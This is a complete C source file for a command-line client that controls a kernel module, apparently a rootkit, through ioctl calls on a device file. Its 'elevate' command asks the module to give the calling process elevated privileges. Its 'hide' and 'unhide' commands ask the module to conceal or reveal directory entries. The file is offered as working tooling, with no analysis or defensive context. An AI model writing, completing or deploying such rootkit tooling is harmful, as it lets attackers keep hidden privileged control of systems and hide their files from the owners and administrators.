#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "rk2600_protocol.h"

#define COMPANION_EXIT_USAGE 2

struct options {
    const char *device_path;
    const char *command;
    const char *name;
};

static void print_usage(FILE *stream, const char *program_name)
{
    fprintf(stream,
            "Usage: %s [--device PATH] <command> [NAME]\n"
            "\n"
            "Commands:\n"
            "  status         Read the module API version\n"
            "  elevate        Request elevated privileges for this process\n"
            "  hide NAME      Ask the module to hide a directory entry\n"
            "  unhide NAME    Ask the module to reveal a directory entry\n"
            "\n"
            "Default device: %s\n",
            program_name, RK2600_DEVICE_PATH);
}

static bool name_is_valid(const char *name)
{
    size_t length;

    if (name == NULL || name[0] == '\0') {
        fprintf(stderr, "NAME must not be empty.\n");
        return false;
    }

    length = strlen(name);
    if (length > RK2600_NAME_MAX) {
        fprintf(stderr, "NAME is longer than %u bytes.\n",
                (unsigned int)RK2600_NAME_MAX);
        return false;
    }

    if (strchr(name, '/') != NULL) {
        fprintf(stderr, "NAME must be a directory entry, not a path.\n");
        return false;
    }

    if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) {
        fprintf(stderr, "NAME cannot be '.' or '..'.\n");
        return false;
    }

    return true;
}

static bool parse_options(int argc, char **argv, struct options *options)
{
    int index = 1;
    int remaining;

    options->device_path = RK2600_DEVICE_PATH;
    options->command = NULL;
    options->name = NULL;

    while (index < argc && strncmp(argv[index], "--", 2U) == 0) {
        if (strcmp(argv[index], "--device") == 0) {
            if (index + 1 >= argc || argv[index + 1][0] == '\0') {
                fprintf(stderr, "--device requires a non-empty path.\n");
                return false;
            }
            options->device_path = argv[index + 1];
            index += 2;
        } else {
            fprintf(stderr, "Unknown option: %s\n", argv[index]);
            return false;
        }
    }

    if (index >= argc) {
        fprintf(stderr, "A command is required.\n");
        return false;
    }

    options->command = argv[index];
    index++;
    remaining = argc - index;

    if (strcmp(options->command, "status") == 0 ||
        strcmp(options->command, "elevate") == 0) {
        if (remaining != 0) {
            fprintf(stderr, "%s takes no argument.\n", options->command);
            return false;
        }
        return true;
    }

    if (strcmp(options->command, "hide") == 0 ||
        strcmp(options->command, "unhide") == 0) {
        if (remaining != 1) {
            fprintf(stderr, "%s requires exactly one NAME argument.\n",
                    options->command);
            return false;
        }
        options->name = argv[index];
        return name_is_valid(options->name);
    }

    fprintf(stderr, "Unknown command: %s\n", options->command);
    return false;
}

static int open_device(const char *path)
{
    int fd = open(path, O_RDWR | O_CLOEXEC);

    if (fd < 0) {
        fprintf(stderr, "Cannot open %s: %s\n", path, strerror(errno));
    }
    return fd;
}

static int report_ioctl_error(const char *operation)
{
    fprintf(stderr, "%s request failed: %s\n", operation, strerror(errno));
    return -1;
}

static int request_status(int fd)
{
    struct rk2600_status status = {0};

    if (ioctl(fd, RK2600_IOC_STATUS, &status) < 0) {
        return report_ioctl_error("Status");
    }

    printf("Module API version: %u\n", (unsigned int)status.api_version);
    if (status.api_version != RK2600_API_VERSION) {
        fprintf(stderr, "Unsupported API version (expected %u).\n",
                (unsigned int)RK2600_API_VERSION);
        return -1;
    }

    puts("Module is reachable.");
    return 0;
}

static int request_elevation(int fd)
{
    if (ioctl(fd, RK2600_IOC_ELEVATE) < 0) {
        return report_ioctl_error("Elevation");
    }

    printf("Elevation request accepted (euid=%ld).\n", (long)geteuid());
    return 0;
}

static int request_name_change(int fd, const char *command, const char *name)
{
    struct rk2600_name_request request = {0};
    unsigned long request_code;
    size_t length = strlen(name);

    memcpy(request.name, name, length + 1U);
    if (strcmp(command, "hide") == 0) {
        request_code = RK2600_IOC_HIDE;
    } else {
        request_code = RK2600_IOC_UNHIDE;
    }

    if (ioctl(fd, request_code, &request) < 0) {
        return report_ioctl_error(command);
    }

    printf("%s request accepted for '%s'.\n", command, name);
    return 0;
}

static int run_command(const struct options *options)
{
    int fd = open_device(options->device_path);
    int result;

    if (fd < 0) {
        return -1;
    }

    if (strcmp(options->command, "status") == 0) {
        result = request_status(fd);
    } else if (strcmp(options->command, "elevate") == 0) {
        result = request_elevation(fd);
    } else {
        result = request_name_change(fd, options->command, options->name);
    }

    if (close(fd) < 0 && result == 0) {
        fprintf(stderr, "Cannot close %s: %s\n", options->device_path,
                strerror(errno));
        result = -1;
    }
    return result;
}

int main(int argc, char **argv)
{
    struct options options;

    if (argc == 2 && strcmp(argv[1], "--help") == 0) {
        print_usage(stdout, argv[0]);
        return 0;
    }

    if (!parse_options(argc, argv, &options)) {
        print_usage(stderr, argv[0]);
        return COMPANION_EXIT_USAGE;
    }

    return run_command(&options) == 0 ? 0 : 1;
}
